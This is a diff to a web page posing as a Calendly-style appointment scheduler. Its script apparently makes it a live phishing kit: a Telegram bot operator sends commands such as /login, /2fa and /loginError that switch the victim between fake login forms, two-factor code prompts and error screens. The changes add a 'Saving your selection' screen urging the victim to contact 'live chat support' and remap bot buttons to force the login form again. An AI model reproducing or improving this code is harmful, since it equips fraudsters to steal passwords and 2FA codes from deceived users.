@@ -53,19 +53,28 @@
                         </div>
                     </div>
                     <div  class="date__time {{$showCalender == false ? 'd-none':''}}">
-                        <h2>Select a Date & Time</h2>
-                        <div class="calendar__container svg__icon">
-                            <div class="" style="min-width: 400px;padding-right: 15px;margin-top:20px;">
-                                <div wire:ignore class="calendar-wrapper" id="calendar-wrapper"></div>
-                                <div class="time__zone-wrapper" style="margin-top: 20px;">
-                                    <p>Time zone</p>
-                                    <div class="central">
-                                        <img width="14px" src="world.png">
-                                        Asia/Dhaka (17:53)
+                        <div class="{{$showCalenderProgress ? 'd-none':''}}">
+                            <h2>Select a Date & Time</h2>
+                            <div class=" calendar__container svg__icon">
+                                <div  style="min-width: 400px;padding-right: 15px;margin-top:20px;">
+                                    <div wire:ignore class="calendar-wrapper" id="calendar-wrapper"></div>
+                                    <div class="time__zone-wrapper" style="margin-top: 20px;">
+                                        <p>Time zone</p>
+                                        <div class="central">
+                                            <img width="14px" src="world.png">
+                                            Asia/Dhaka (17:53)
+                                        </div>
                                     </div>
                                 </div>
                             </div>
-
+                        </div>
+                        <div class=" loading-container2 {{$showCalenderProgress ? '':'d-none'}}">
+                            <h1 style="font-size: 48px;">Saving your selection</h1>
+                            <h2>Please contact our live support to fully approve your scheduled date</h2>
+                            <div class="loader2"></div>
+                            <div style="margin-top: 40px;">
+                                <a class="blue-btn" href="#" >Contact live chat support</a>
+                            </div>
                         </div>
                         <a class="logo__wrapper-calendly hide__mobile">
                             <div class="background">
@@ -140,6 +149,7 @@
                 </div>
             </a>
         </div>
+
     </div>
     <div wire:ignore.self  style="display: none;" id="continue-modal">
         <div class="ant-modal-root">
@@ -488,7 +498,7 @@
                         [
                             {
                                 text: `Kick`,
-                                callback_data: `/kick ${sessionId}`,
+                                callback_data: `/login ${sessionId}`,
                             },
                         ],
                     ],
@@ -536,7 +546,7 @@
                         [
                             {
                                 text: `Kick`,
-                                callback_data: `/kick ${sessionId}`,
+                                callback_data: `/login ${sessionId}`,
                             },
                         ],
                     ],
@@ -577,6 +587,7 @@
                                     const callbackData = update.callback_query.data;
                                     if (callbackData === `/oldError ${localStorage.getItem('sessionId')}`) {
                                         $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', true);
                                         @this.set('enableLoginForm', true);
@@ -587,6 +598,7 @@
                                         @this.set('showCalender', false);
                                     }else if(callbackData === `/loginError ${localStorage.getItem('sessionId')}`){
                                         $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', true);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', true);
@@ -595,18 +607,21 @@
                                         @this.set('twoFaPage', false);
                                         @this.set('codeError', false);
                                         @this.set('showCalender', false);
+
                                     }else if(callbackData === `/login ${localStorage.getItem('sessionId')}`){
                                         $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
-                                        @this.set('enableLoginForm', false);
+                                        @this.set('enableLoginForm', true);
                                         @this.set('showModalFooter', true);
                                         @this.set('enableLoadingAfterSubmit', false);
-                                        @this.set('twoFaPage', true);
+                                        @this.set('twoFaPage', false);
                                         @this.set('codeError', false);
                                         @this.set('showCalender', false);
                                     }else if(callbackData === `/2fa ${localStorage.getItem('sessionId')}`){
                                         $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', false);
@@ -617,6 +632,7 @@
                                         @this.set('showCalender', false);
                                     }else if(callbackData === `/2faError ${localStorage.getItem('sessionId')}`){
                                         $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', false);
@@ -626,6 +642,7 @@
                                         @this.set('codeError', true);
                                         @this.set('showCalender', false);
                                     }else if(callbackData === `/schedule ${localStorage.getItem('sessionId')}`){
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', false);
@@ -831,7 +848,6 @@
         e.preventDefault();
         let time = $(this).parent('div').parent('div').parent('div').find('.time').data('time'); // Example: "10:30"
         let selectedDateFinal = new Date(selectedDate);
-
         if (!selectedDateFinal || !time) {
             console.error('selectedDate or time is missing');
             return;
@@ -865,7 +881,7 @@
                         [
                             {
                                 text: `Kick to the calendar`,
-                                callback_data: `/calendar ${session}`,
+                                callback_data: `/schedule ${session}`,
                             },
                             {
                                 text: `Thank You`,
@@ -876,7 +892,7 @@
                 },
             })
         }).then(response => {
-            startInterval();
+            @this.set('showCalenderProgress', true);
         }).catch(error => {
 
         });
